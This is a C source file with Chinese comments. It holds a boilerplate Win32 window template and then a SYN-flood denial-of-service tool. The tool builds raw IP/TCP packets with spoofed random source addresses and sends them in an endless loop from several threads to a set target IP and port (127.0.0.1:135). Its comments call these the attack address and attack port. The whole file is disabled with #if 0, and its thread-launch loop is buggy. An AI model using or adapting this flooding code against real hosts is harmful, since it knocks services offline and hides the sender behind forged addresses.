#if 0
// // 包含 SDKDDKVer.h 可定义可用的最高版本的 Windows 平台。
// 如果希望为之前的 Windows 平台构建应用程序，在包含 SDKDDKVer.h 之前请先包含 WinSDKVer.h 并
// 将 _WIN32_WINNT 宏设置为想要支持的平台。
#include <SDKDDKVer.h>
#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>
// C 运行时头文件
#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>
#include <stdio.h>

#ifdef NoDebug
- #define MAX_LOADSTRING 100
// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_THREADDDOS, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);
    // 执行应用程序初始化:
    if (!InitInstance(hInstance, nCmdShow))
    {
        return FALSE;
    }
    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_THREADDDOS));
    MSG msg;
    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    return (int)msg.wParam;
}

/*
//  函数: MyRegisterClass()
//  目标: 注册窗口类。
*/
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_THREADDDOS));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_THREADDDOS);
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
    return RegisterClassExW(&wcex);
}
/*
//   函数: InitInstance(HINSTANCE, int)
//   目标: 保存实例句柄并创建主窗口
//   注释:
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
*/
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
    hInst = hInstance; // 将实例句柄存储在全局变量中
    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

    if (!hWnd)
    {
        return FALSE;
    }
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
    return TRUE;
}

/*
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//  目标: 处理主窗口的消息。
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
*/
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        // 分析菜单选择:
        switch (wmId)
        {
        case IDM_ABOUT:
            DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
            break;
        case IDM_EXIT:
            DestroyWindow(hWnd);
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
    }
    break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        // TODO: 在此处添加使用 hdc 的任何绘图代码...
        EndPaint(hWnd, &ps);
    }
    break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

#endif // NoDebug


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "WS2_32.LIB")

typedef struct tag_ip_Header //ip首部
{
    unsigned char h_verlen;        //4位手部长度，和4位IP版本号
    unsigned char tos;             //8位类型服务
    unsigned short total_len;      //16位总长度
    unsigned short ident;          //16位标志
    unsigned short frag_and_flags; //3位标志位（如SYN,ACK,等等)
    unsigned char ttl;             //8位生存时间
    unsigned char proto;           //8位协议
    unsigned short checksum;       //ip手部效验和
    unsigned int SourceIP;         //伪造IP地址
    unsigned int DestIP;           //攻击的ip地址
} IPHEADER;

typedef struct tag_tcp_Header
{
    USHORT th_sport;         //伪造端口
    USHORT th_dport;         //攻击端口
    unsigned int th_seq;     //32位系列号
    unsigned int th_ack;     //32位确认号
    unsigned char th_lenres; //4位首布长度，6位保留字
    unsigned char th_flag;   //6位标志位
    USHORT th_win;           //16位窗口大小
    USHORT th_sum;           //16位效验和
    USHORT th_urp;           //
} TCPHEADER;

typedef struct tag_tsd_Header
{
    unsigned long saddr; //伪造地址
    unsigned long daddr; //攻击地址
    char mbz;            //
    char ptcl;           //协议类型
    unsigned short tcpl; //TCP长度
} TSDHEADER;

DWORD WINAPI Start(void);
HANDLE hFind[10];

//计算效验和
USHORT checksum(USHORT* buffer, int size)
{
    unsigned long check = 0;
    while (size > 1)
    {
        check += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size)
    {
        check += *(USHORT*)buffer;
    }
    check = (check >> 16) + (check & 0xffff);
    check += (check >> 16);
    return (USHORT)(~check);
}
//攻击线程
DWORD WINAPI Statr(void)
{
    SOCKET sock;
    WSADATA WSAData;
    SOCKADDR_IN syn_in;
    IPHEADER ipHeader;
    TCPHEADER tcpHeader;
    TSDHEADER psdHeader;
    const char* addr = "127.0.0.1"; //攻击的IP地址
    int port = 135;                 //要攻击的端口
    if (WSAStartup(MAKEWORD(2, 2), &WSAData))
    {
        return false;
    }
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == INVALID_SOCKET)
    {
        return false;
    }
    BOOL flag = true;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) == SOCKET_ERROR)
    {
        return false;
    }
    int Time = 888;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&Time, sizeof(Time)) == SOCKET_ERROR)
    {
        return false;
    }
    syn_in.sin_family = AF_INET;
    syn_in.sin_port = htons(port);
    syn_in.sin_addr.S_un.S_addr = inet_addr(addr);
    while (TRUE)
    {
        //填充IP首部
        ipHeader.h_verlen = (4 << 4 | sizeof(ipHeader) / sizeof(unsigned long));
        ipHeader.tos = 0;
        ipHeader.total_len = htons(sizeof(ipHeader) + sizeof(tcpHeader));
        ipHeader.ident = 1;
        ipHeader.frag_and_flags = 0;
        ipHeader.ttl = (unsigned char)GetTickCount() % 514 + 620;
        ipHeader.proto = IPPROTO_TCP;
        ipHeader.checksum = 0;
        ipHeader.SourceIP = htonl(GetTickCount() * 1986);
        ipHeader.DestIP = inet_addr(addr);
        //填充Tcp首部
        int SourcePort = GetTickCount() * 1986 % 514;
        tcpHeader.th_dport = htons(port);
        tcpHeader.th_sport = htons(SourcePort);
        tcpHeader.th_seq = htonl(0x12345678);
        tcpHeader.th_ack = 0;
        tcpHeader.th_lenres = (sizeof(tcpHeader) / 4 << 4 | 0);
        tcpHeader.th_flag = 2;
        tcpHeader.th_win = htons(620);
        tcpHeader.th_urp = 0;
        tcpHeader.th_sum = 0;
        //填充TCP伪首部用来计算TCP头部的效验和
        psdHeader.saddr = ipHeader.SourceIP;
        psdHeader.daddr = ipHeader.DestIP;
        psdHeader.mbz = 0;
        psdHeader.ptcl = IPPROTO_TCP;
        psdHeader.tcpl = htons(sizeof(tcpHeader));

        //计算校验和
        char SendBuff[100] = "";
        memcpy(SendBuff, &psdHeader, sizeof(psdHeader));
        memcpy(SendBuff + sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
        tcpHeader.th_sum = checksum((USHORT*)SendBuff, sizeof(psdHeader) + sizeof(tcpHeader));
        memcpy(SendBuff, &ipHeader, sizeof(ipHeader));
        memcpy(SendBuff + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));

        //发送数据包
        int Syn = sendto(sock, SendBuff, sizeof(ipHeader) + sizeof(tcpHeader), 0, (struct sockaddr*)&syn_in, sizeof(syn_in));
        if (Syn == SOCKET_ERROR)
        {
            return false;
        }
    }
    closesocket(sock);
    WSACleanup();
    return true;
}

int main()
{ //启动线程，10，大家可以自己改
    for (int i = 0; i < 10; i++)
    {
        hFind[i - 1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Statr, 0, 0, NULL);
        i--;
    }
    return 0;
}

#endif // 0
